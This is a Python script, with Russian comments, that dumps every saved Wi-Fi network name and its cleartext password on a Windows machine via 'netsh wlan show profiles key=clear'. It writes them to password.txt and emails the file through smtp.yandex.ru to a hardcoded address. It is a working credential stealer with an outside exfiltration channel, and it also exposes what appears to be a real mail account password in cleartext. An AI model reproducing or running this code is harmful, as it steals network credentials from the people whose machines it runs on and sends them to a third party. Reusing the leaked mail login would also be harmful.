import subprocess
import re

command_output = subprocess.run(
    ["netsh", "wlan", "show", "profiles"], capture_output=True
).stdout.decode("CP866")

print(command_output)

profile_name = re.findall("Все профили пользователей     : (.*)\r", command_output)


wifi_list = []

if len(profile_name) != 0:
    for name in profile_name:
        wifi_profile = {}
        profile_info = subprocess.run(
            ["netsh", "wlan", "show", "profiles", name, "key=clear"],
            capture_output=True
        ).stdout.decode("CP866")
        print(profile_info)
        if re.search("Ключ безопасности:       Отсутствует", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name

            profile_info_pass = subprocess.run(
                ["netsh", "wlan", "show", "profiles", name, "key=clear"],
                capture_output=True
            ).stdout.decode("CP866")
            password = re.search("Содержимое ключа            : (.*)\r", profile_info_pass)
            if password == None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]
            wifi_list.append(wifi_profile)

with open("password.txt", "w") as file:
    for x in range(len(wifi_list)):
        file.write(wifi_list[x]["ssid"]+" : ")
        file.write(wifi_list[x]["password"] + "\n")
        print(wifi_list[x])
"""     
   
 Блок отправки почты
 
"""

import smtplib

# данные почтового сервиса
user = "segamegadraiv200@yandex.ru"
passwd = "nfvzqqmdydjruuns"
server = "smtp.yandex.ru"
port = 587

# тема письма
subject = "Тестовое письмо от Python."
# кому
to = "segamegadraiv200@yandex.ru"
# кодировка письма
charset = 'Content-Type: text/plain; charset=utf-8'
mime = 'MIME-Version: 1.0'
# текст письма
text = open('password.txt', 'r').read()

# формируем тело письма
body = "\r\n".join((f"From: {user}", f"To: {to}",
       f"Subject: {subject}", mime, charset, "", text))

try:
    # подключаемся к почтовому сервису
    smtp = smtplib.SMTP(server, port)
    smtp.starttls()
    smtp.ehlo()
    # логинимся на почтовом сервере
    smtp.login(user, passwd)
    # пробуем послать письмо
    smtp.sendmail(user, to, body.encode('utf-8'))
except smtplib.SMTPException as err:
    print('Что - то пошло не так...')
    raise err
finally:
    smtp.quit()